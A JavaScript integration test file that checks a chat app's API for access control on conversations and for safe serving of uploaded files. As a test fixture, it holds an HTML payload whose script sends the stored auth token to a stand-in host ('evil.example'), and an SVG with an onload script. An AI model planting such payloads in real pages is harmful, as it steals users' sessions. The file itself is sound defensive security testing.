// Security checks for the app's own API (/api/*) against a real local Worker:
// who may read or change a conversation, what an uploaded file is served as,
// who may delete or list files, and how hard the sign-in can be hammered.
//
//   node --test frontend/tests/workerSecurity.integration.test.mjs
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { after, before, test } from 'node:test';
import { startDevWorker } from './helpers/devWorker.mjs';

const ADMIN = { name: 'Owner', email: 'owner@example.com', password: 'owner-password-1234' };
const PASSWORD = 'staff-password-1234';

let worker;
let admin;      // tokens
let alice;
let bob;
let mallory;    // a staff member who is not in Alice and Bob's chat

/** The app's API with a bearer token, the way the app calls it. */
async function api(token, path, { method = 'GET', body, form, headers = {} } = {}) {
    const h = new Headers(headers);
    if (token) h.set('Authorization', `Bearer ${token}`);
    if (body !== undefined) h.set('Content-Type', 'application/json');
    const res = await fetch(`${worker.origin}/api${path}`, {
        method, headers: h, body: form ?? (body === undefined ? undefined : JSON.stringify(body)),
    });
    const text = await res.text();
    let json = null;
    try { json = JSON.parse(text); } catch { /* not JSON */ }
    return { status: res.status, body: json, text, headers: res.headers };
}

async function login(email, password) {
    const res = await api(null, '/auth/login', { method: 'POST', body: { email, password } });
    assert.equal(res.status, 200, `login ${email}: ${res.text}`);
    return { token: res.body.token, id: res.body.user.id };
}

before(async () => {
    // The app's own tables, as a fresh install has them.
    const schema = readFileSync(new URL('../schema.sql', import.meta.url), 'utf8');
    worker = await startDevWorker({ port: 8814, inspectorPort: 9244, seedLegacy: { sql: schema } });
    assert.equal((await api(null, '/auth/setup', { method: 'POST', body: ADMIN })).status, 200);
    admin = await login(ADMIN.email, ADMIN.password);
    for (const [name, email] of [['Alice', 'alice@example.com'], ['Bob', 'bob@example.com'], ['Mallory', 'mallory@example.com']]) {
        const res = await api(admin.token, '/auth/users', { method: 'POST', body: { name, email, password: PASSWORD } });
        assert.ok(res.status === 200 || res.status === 201, res.text);
    }
    alice = await login('alice@example.com', PASSWORD);
    bob = await login('bob@example.com', PASSWORD);
    mallory = await login('mallory@example.com', PASSWORD);
});

after(async () => {
    await worker?.stop();
    worker?.cleanup();
});

/* ── Conversations ─────────────────────────────────────────────────────── */

test('a conversation is only readable and changeable by its members', async () => {
    const convId = `conv_${Date.now()}`;
    const conv = { id: convId, participantIds: [alice.id, bob.id], participantNames: ['Alice', 'Bob'], lastMessage: '', lastMessageTime: Date.now(), unreadCount: 0 };
    assert.equal((await api(alice.token, '/conversations', { method: 'POST', body: conv })).status, 201);
    const msg = { id: `msg_${Date.now()}`, conversationId: convId, senderId: alice.id, senderName: 'Alice', text: 'private', timestamp: Date.now() };
    assert.equal((await api(alice.token, '/messages', { method: 'POST', body: msg })).status, 201);

    // Members read it.
    const own = await api(bob.token, `/messages?conversationId=${encodeURIComponent(convId)}`);
    assert.equal(own.status, 200);
    assert.equal(own.body.length, 1);

    // Someone else cannot read it by id…
    assert.equal((await api(mallory.token, `/messages?conversationId=${encodeURIComponent(convId)}`)).status, 403);
    // …cannot take it over by "creating" it again with themselves in it…
    const takeover = await api(mallory.token, '/conversations', { method: 'POST', body: { ...conv, participantIds: [mallory.id] } });
    assert.equal(takeover.status, 403);
    // …cannot add themselves with an update…
    assert.equal((await api(mallory.token, `/conversations/${encodeURIComponent(convId)}`, { method: 'PUT', body: { ...conv, participantIds: [alice.id, bob.id, mallory.id] } })).status, 403);
    // …and cannot delete it.
    assert.equal((await api(mallory.token, `/conversations/${encodeURIComponent(convId)}`, { method: 'DELETE' })).status, 403);

    // Nothing changed for the members.
    const still = await api(alice.token, `/messages?conversationId=${encodeURIComponent(convId)}`);
    assert.equal(still.body.length, 1);
    const list = await api(alice.token, '/conversations');
    assert.deepEqual(list.body.find(c => c.id === convId).participantIds, [alice.id, bob.id]);

    // A member may retry the create and update it; an admin may still manage it.
    assert.equal((await api(alice.token, '/conversations', { method: 'POST', body: conv })).status, 201);
    assert.equal((await api(bob.token, `/conversations/${encodeURIComponent(convId)}`, { method: 'PUT', body: { ...conv, isPinned: true } })).status, 200);
    assert.equal((await api(admin.token, `/messages?conversationId=${encodeURIComponent(convId)}`)).status, 200);

    // An unknown id reads as empty, not as an error that confirms anything.
    const unknown = await api(mallory.token, '/messages?conversationId=conv_does_not_exist');
    assert.equal(unknown.status, 200);
    assert.deepEqual(unknown.body, []);
});

/* ── Uploads ───────────────────────────────────────────────────────────── */

const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52]);
const HTML = '<!doctype html><script>fetch("//evil.example/?t="+localStorage.getItem("vayu_auth_token"))</script>';

async function upload(token, content, name, type) {
    const form = new FormData();
    form.append('file', new File([content], name, { type }));
    const res = await api(token, '/upload', { method: 'POST', form });
    assert.equal(res.status, 200, res.text);
    return res.body.key;
}

test('an uploaded web page is never served as a web page', async () => {
    for (const [name, type] of [['page.html', 'text/html'], ['sneaky.png', 'image/png'], ['doc.pdf', 'application/pdf']]) {
        const key = await upload(mallory.token, HTML, name, type);
        const res = await fetch(`${worker.origin}/api/files/${key}`);
        assert.equal(res.status, 200);
        assert.equal(res.headers.get('content-type'), 'application/octet-stream', name);
        assert.match(res.headers.get('content-disposition'), /^attachment;/, name);
        assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
        assert.match(res.headers.get('content-security-policy'), /sandbox/);
    }
});

test('real images still show, SVG only inside a sandbox', async () => {
    const png = await fetch(`${worker.origin}/api/files/${await upload(alice.token, PNG, 'art.png', 'image/png')}`);
    assert.equal(png.headers.get('content-type'), 'image/png');
    assert.match(png.headers.get('content-disposition'), /^inline;/);
    assert.equal(png.headers.get('x-content-type-options'), 'nosniff');

    // Claimed as text, but the bytes are a PNG: stored and shown as the image it is.
    const relabelled = await fetch(`${worker.origin}/api/files/${await upload(alice.token, PNG, 'art.txt', 'text/plain')}`);
    assert.equal(relabelled.headers.get('content-type'), 'image/png');

    const svg = await fetch(`${worker.origin}/api/files/${await upload(alice.token, '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', 'logo.svg', 'image/svg+xml')}`);
    assert.equal(svg.headers.get('content-type'), 'image/svg+xml');
    assert.match(svg.headers.get('content-security-policy'), /sandbox/);
});

test('a thumbnail must be an image', async () => {
    const form = new FormData();
    form.append('file', new File([PNG], 'art.png', { type: 'image/png' }));
    form.append('thumb', new File([HTML], 'thumb.jpg', { type: 'image/jpeg' }));
    const res = await api(alice.token, '/upload', { method: 'POST', form });
    assert.equal(res.status, 200);
    // No thumbnail stored, so the thumbnail address falls back to the original image.
    const thumb = await fetch(`${worker.origin}${res.body.thumbUrl}`);
    assert.equal(thumb.headers.get('content-type'), 'image/png');
});
